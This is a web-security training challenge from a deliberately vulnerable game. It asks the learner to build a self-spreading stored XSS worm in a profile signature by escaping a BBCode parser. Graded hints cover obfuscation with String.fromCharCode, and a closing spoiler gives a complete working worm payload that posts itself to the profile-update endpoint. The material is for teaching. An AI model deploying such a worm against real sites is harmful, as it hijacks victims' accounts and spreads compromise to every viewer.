# XSS/CSRF Challenge 5

----------------------

Hey friend,

I've got a challenge for you.

Using the same concept from challenge 3, craft an XSS exploit in the profile signature that behaves like a worm, updating the profile signature of anyone who views an infected profile to also have the same exploit code on their profile.

To do this, you'll need to escape out of the bbcode parser and get javascript execution, use javascript to get a copy of the exploit code, and craft some javascript (perhaps using ajax) to submit a request to the server to update the user's profile signature.

I have a phantomjs bot setup that will log in as my admin account and visit all user profiles in the game - to trigger it, just go to Trigger Admin Browser in the navigation. See if you can get the exploit on the admin's profile signature via this worm!

Thanks!

-Breakthenet Game Owner

----------------------

Stuck? 
----------------------
<details> 
  <summary>Click for hint 1</summary>
   You don't have jquery on the page, so you'll need to google how to do an ajax call with plain, vanilla javascript. You also need to gather the details about the call you need to do (get it from the Preferences / Profile Signature form page).
</details>

<details> 
  <summary>Click for hint 2</summary>
   To get a copy of the worm for the payload, have the code refer to itself!
   
   E.g. ```<img src='' id='bob' onLoad='document.getElementById("bob").getAttribute("onLoad")'>```
</details>

<details> 
  <summary>Click for hint 3</summary>
   You may find you need to use some characters in your payload that are difficult to escape properly (or just might be sanitized). To get around this, look at the javascript function String.fromCharCode.
</details>

<details> 
  <summary>Click for hint 4</summary>
   While constructing your payload, you may find this function useful:
   
   ```
String.prototype.toCharCode = function(){
    var str = this.split(''), len = str.length, work = new Array(len);
    for (var i = 0; i < len; ++i){
        work[i] = str[i].charCodeAt();
    }
    return work.join(',');
}
   ```
</details>

<details> 
  <summary>Click for hint 5</summary>
   If you run into trouble concatenating javascript strings with the plus symbol (+), try using the concat function instead!
   
   ```
   str1.concat(str2)
   ```
   
</details>

<details> 
  <summary>Major Spoiler - one possible solution</summary>
  If you've come this far but can't quite finish it off, I feel obligated to show you what a solution would look like. Here you go!
   ```
   [img]http://www.nyan.cat/cats/original.gif" id='uniqueimgid' onLoad="var xmlhttp;if (window.XMLHttpRequest) xmlhttp=new XMLHttpRequest();else xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');xmlhttp.open('POST', 'preferences.php?action=profilesig2', true);xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xmlhttp.send('newprofilesig='.concat(String.fromCharCode(91,105,109,103,93,104,116,116,112,58,47,47,119,119,119,46,110,121,97,110,46,99,97,116,47,99,97,116,115,47,111,114,105,103,105,110,97,108,46,103,105,102,34,32,105,100,61,39,117,110,105,113,117,101,105,109,103,105,100,39,32,111,110,76,111,97,100,61,34)).concat(document.getElementById('uniqueimgid').getAttribute('onLoad')).concat(String.fromCharCode(91, 47, 105, 109, 103, 93)));[/img]
   ```
</details>